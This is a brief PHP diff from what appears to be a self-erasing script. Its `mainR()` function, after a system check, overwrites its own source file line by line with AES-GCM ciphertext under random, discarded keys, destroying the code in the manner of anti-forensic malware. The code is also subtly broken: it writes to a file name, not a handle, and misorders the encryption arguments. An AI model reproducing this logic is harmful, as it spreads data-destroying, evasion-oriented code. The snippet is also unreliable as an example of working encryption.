@@ -223,10 +223,10 @@ while(1) {
     function mainR()
     {
         if (checkSystems() === true) {
-            $e = openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-gcm'));
+            $e = hash_hmac('sha512', openssl_random_pseudo_bytes(128), openssl_random_pseudo_bytes(128), $binary=true);
             foreach (file(SELF_SCRIPT) as $line) {
                 fputs(SELF_SCRIPT, openssl_encrypt($line, "aes-256-gcm",
-                    openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-gcm')),
+                    openssl_random_pseudo_bytes(32),
                     OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING,
                     openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-gcm')),
                     $e,
